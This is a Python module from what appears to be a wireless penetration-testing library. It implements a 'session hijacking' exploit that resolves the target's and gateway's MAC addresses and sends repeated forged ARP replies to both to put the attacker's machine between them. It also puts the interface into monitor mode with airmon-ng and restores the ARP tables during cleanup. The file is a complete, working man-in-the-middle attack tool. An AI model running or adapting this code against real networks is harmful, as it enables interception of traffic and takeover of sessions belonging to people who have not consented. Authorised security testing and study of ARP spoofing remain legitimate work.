# wireless_pen_test_lib/exploits/session_hijacking.py

import time
import threading
import logging
from scapy.all import send, sr, conf
import subprocess
from scapy.layers.l2 import Ether, ARP

from .base_exploit import BaseExploit


class SessionHijacking(BaseExploit):
    """
    A class to perform session hijacking via ARP spoofing.
    """

    def __init__(self, core_framework, vulnerability, max_packets: int = 100, interval: float = 2.0):
        """
        Initialize the SessionHijacking exploit.

        Args:
            core_framework: The core framework instance.
            vulnerability (dict): Information about the vulnerability, including target and gateway IPs.
            max_packets (int): Maximum number of spoofed ARP packets to send.
            interval (float): Time interval between sending ARP spoofing packets in seconds.
        """
        super().__init__(core_framework, vulnerability)
        self.max_packets = max_packets
        self.interval = interval
        self.detected_vulnerabilities = []
        self.stop_event = threading.Event()
        self.thread = None
        self.logger = logging.getLogger(self.__class__.__name__)

        # Extract necessary information from vulnerability dict
        self.target_ip = self.vulnerability.get('target_ip')
        self.gateway_ip = self.vulnerability.get('gateway_ip')
        self.interface = self.core.packet_handler.packet_injector.interface

        if not self.target_ip or not self.gateway_ip:
            self.logger.error("Both target_ip and gateway_ip must be specified in vulnerability info.")
            raise ValueError("Missing target_ip or gateway_ip in vulnerability info.")

        self.target_mac = None
        self.gateway_mac = None

    def execute(self):
        """
        Execute the session hijacking exploit.

        Returns:
            dict: Status of the exploit execution with detected vulnerabilities.
        """
        self.logger.info(f"Starting Session Hijacking on target IP: {self.target_ip}")
        try:
            # Ensure the interface is in monitor mode
            self._ensure_monitor_mode()

            # Resolve MAC addresses
            self.target_mac = self._get_mac(self.target_ip)
            self.gateway_mac = self._get_mac(self.gateway_ip)

            if not self.target_mac:
                self.logger.error(f"Could not resolve MAC address for target IP: {self.target_ip}")
                return {"status": "error", "message": f"Could not resolve MAC address for target IP: {self.target_ip}"}

            if not self.gateway_mac:
                self.logger.error(f"Could not resolve MAC address for gateway IP: {self.gateway_ip}")
                return {"status": "error", "message": f"Could not resolve MAC address for gateway IP: {self.gateway_ip}"}

            self.logger.debug(f"Target MAC: {self.target_mac}, Gateway MAC: {self.gateway_mac}")

            # Start ARP spoofing thread
            self.thread = threading.Thread(target=self._arp_spoof, daemon=True)
            self.thread.start()

            self.logger.info("Session Hijacking exploit initiated.")
            return {"status": "success"}

        except Exception as e:
            self.logger.exception(f"Failed to execute Session Hijacking exploit: {e}")
            return {"status": "error", "message": str(e)}

    def _ensure_monitor_mode(self):
        """
        Ensures that the network interface is in monitor mode.
        """
        try:
            mode = self.core.packet_handler.packet_injector.get_interface_mode()
            if mode != 'monitor':
                self.logger.info(f"Setting interface {self.interface} to monitor mode.")
                # Example using airmon-ng to set monitor mode
                subprocess.check_call(['airmon-ng', 'start', self.interface],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.logger.info(f"Interface {self.interface} set to monitor mode.")
            else:
                self.logger.debug(f"Interface {self.interface} is already in monitor mode.")

            # Optionally, set the channel if specified in vulnerability
            channel = self.vulnerability.get('channel')
            if channel:
                self.logger.info(f"Setting interface {self.interface} to channel {channel}.")
                subprocess.check_call(['iwconfig', self.interface, 'channel', str(channel)],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.logger.info(f"Interface {self.interface} set to channel {channel}.")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to set monitor mode or channel on interface {self.interface}: {e}")
            raise
        except Exception as e:
            self.logger.exception(f"Unexpected error while setting monitor mode: {e}")
            raise

    def _get_mac(self, ip: str) -> str:
        """
        Get the MAC address for a given IP using ARP request.

        Args:
            ip (str): IP address to resolve.

        Returns:
            str: MAC address if found, else None.
        """
        self.logger.debug(f"Resolving MAC address for IP: {ip}")
        try:
            answered, unanswered = sr(ARP(pdst=ip), timeout=2, iface=self.interface, verbose=False)
            for sent, received in answered:
                self.logger.debug(f"Found MAC for IP {ip}: {received.hwsrc}")
                return received.hwsrc
            self.logger.warning(f"MAC address for IP {ip} could not be resolved.")
            return None
        except Exception as e:
            self.logger.exception(f"Error resolving MAC address for IP {ip}: {e}")
            return None

    def _arp_spoof(self):
        """
        Continuously send spoofed ARP replies to the target and gateway to perform ARP poisoning.
        """
        self.logger.info("Starting ARP spoofing.")
        try:
            count = 0
            while not self.stop_event.is_set() and count < self.max_packets:
                # Tell the target that we are the gateway
                spoof_target = ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst=self.target_mac, hwsrc=self.core.packet_handler.packet_injector.get_interface_mac())
                # Tell the gateway that we are the target
                spoof_gateway = ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst=self.gateway_mac, hwsrc=self.core.packet_handler.packet_injector.get_interface_mac())

                send(spoof_target, iface=self.interface, verbose=False)
                send(spoof_gateway, iface=self.interface, verbose=False)

                self.logger.debug(f"Sent spoofed ARP packets: {count+1}/{self.max_packets}")
                count += 1
                time.sleep(self.interval)

            self.logger.info("ARP spoofing reached maximum packet count or was stopped.")
        except Exception as e:
            self.logger.exception(f"Error during ARP spoofing: {e}")
            self.stop_event.set()

    def cleanup(self):
        """
        Cleans up after exploitation to restore the environment.
        """
        self.logger.info("Cleaning up Session Hijacking exploit.")
        self.stop_event.set()

        if self.thread and self.thread.is_alive():
            self.thread.join()
            self.logger.debug("ARP spoofing thread has been terminated.")

        # Restore ARP tables
        self._restore_arp()

        # Reset interface to managed mode if it was changed
        self._reset_interface()

        self.logger.info("Session Hijacking exploit stopped.")

    def _restore_arp(self):
        """
        Restore the normal ARP tables by sending correct ARP replies.
        """
        self.logger.info("Restoring ARP tables.")
        try:
            # Send the correct ARP information to the target and gateway
            send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=self.target_mac, hwdst="ff:ff:ff:ff:ff:ff"), count=5, iface=self.interface, verbose=False)
            send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=self.gateway_mac, hwdst="ff:ff:ff:ff:ff:ff"), count=5, iface=self.interface, verbose=False)
            self.logger.info("ARP tables restored successfully.")
        except Exception as e:
            self.logger.exception(f"Failed to restore ARP tables: {e}")

    def _reset_interface(self):
        """
        Reset the network interface to managed mode if it was changed.
        """
        try:
            mode = self.core.packet_handler.packet_injector.get_interface_mode()
            if mode == 'monitor':
                self.logger.info(f"Setting interface {self.interface} back to managed mode.")
                subprocess.check_call(['airmon-ng', 'stop', self.interface],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.logger.info(f"Interface {self.interface} set back to managed mode.")
            else:
                self.logger.debug(f"Interface {self.interface} is already in managed mode.")
        except subprocess.CalledProcessError as e:
            self.logger.warning(f"Failed to reset interface {self.interface} to managed mode: {e}")
        except Exception as e:
            self.logger.exception(f"Unexpected error while resetting interface: {e}")
